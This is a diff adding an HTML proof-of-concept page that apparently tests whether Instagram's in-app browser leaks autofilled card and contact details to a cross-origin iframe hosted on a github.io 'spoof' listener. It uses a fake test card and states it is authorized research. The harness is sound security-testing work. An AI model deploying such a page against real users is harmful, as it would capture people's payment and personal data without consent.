@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Checkout</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ input{width:100%;padding:11px;font-size:16px;border:1px solid #ccc;border-radius:8px;margin:5px 0}
+ iframe{width:100%;height:300px;border:2px solid #c0392b;border-radius:8px}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ .warn{color:#b23;font-size:11px}
+ p{font-size:12px;color:#666}
+</style>
+</head>
+<body>
+<h1>Benign cross-origin autofill-broadcast test</h1>
+<p>Authorized research, own IG test account + FAKE saved card (<b>4111 1111 1111 1111</b>). This TOP
+page is one origin; the red iframe below is a DIFFERENT origin. Trigger IG payment autofill on the
+fields; watch whether the cross-origin iframe receives the autofill VALUES (= cross-origin leak).</p>
+
+<h2>payment form — tap a field, accept IG autofill</h2>
+<form onsubmit="return false" autocomplete="on">
+ <input name="ccname" autocomplete="cc-name" placeholder="name on card">
+ <input name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="card number">
+ <input name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
+ <input name="cvc" autocomplete="cc-csc" inputmode="numeric" placeholder="CVC">
+</form>
+
+<h2>contact form</h2>
+<form onsubmit="return false" autocomplete="on">
+ <input name="name" autocomplete="name" placeholder="full name">
+ <input name="street-address" autocomplete="street-address" placeholder="address">
+ <input name="tel" autocomplete="tel" inputmode="tel" placeholder="phone">
+</form>
+
+<h2>CROSS-ORIGIN iframe (raihanyasa2.github.io) — watch what it receives</h2>
+<!-- change src to your SECOND origin hosting iab_xorigin_listener.html -->
+<iframe id="xf" src="https://raihanyasa2.github.io/spoof/iab_xorigin_listener.html"></iframe>
+
+<h2>top-page log</h2><pre id="log"></pre>
+<p class="warn">Own account + FAKE card only. Prove capability (fake card appears cross-origin), not real data.</p>
+
+<script>
+ var L=document.getElementById('log');
+ function log(m){ L.textContent = m + '\n' + L.textContent; }
+ log('top origin = '+location.origin+'  IG='+/Instagram/i.test(navigator.userAgent));
+ window.addEventListener('message', function(e){
+   try{ if(e.data && e.data.__listener==='ready'){ log('cross-origin listener ready @ '+e.data.origin); return; } }catch(_){}
+ });
+ log('When you accept IG payment autofill, check the RED iframe above: if it shows the card/contact VALUES, that is a cross-origin autofill leak.');
+</script>
+</body>
+</html>
